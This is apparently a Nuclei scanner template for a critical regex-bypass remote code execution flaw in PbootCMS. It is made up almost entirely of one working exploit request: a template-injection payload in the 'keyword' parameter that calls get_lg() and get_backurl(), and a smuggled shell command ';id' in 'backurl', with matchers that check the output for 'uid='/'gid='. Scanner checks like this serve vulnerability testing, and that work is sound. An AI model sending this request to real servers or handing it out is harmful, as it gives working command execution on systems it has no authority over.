id: PbootCMS-keyword-RCE-linux
info:
  name: PbootCMS-keyword-RCE
  author: apple
  severity: critical
  description: PbootCMS 项目路径下 /common/function.php 中存在两个函数 get_lg 和 get_backurl，可绕过正则处理，进而执行命令。
  reference:
    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS漏洞/PbootCMS%20V3.1.2%20正则绕过%20RCE%20漏洞.md
  tags: tags
http:
  - raw:
      - |-
        GET /index.php/keyword?keyword=}{pboot:if((get_lg/*aaa-*/())/**/(get_backurl/*aaa-*/()))}123321aaa{/pboot:if}&backurl=;id HTTP/1.1
        Host: {{Hostname}}
        Accept: text/plain, */*; q=0.01
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Referer: your-ip
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: lg=system; PbootSystem=8ea446nv2usihctikbjm7qg6c6
        Connection: close
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'gid='
      - type: word
        part: body
        words:
          - 'uid='
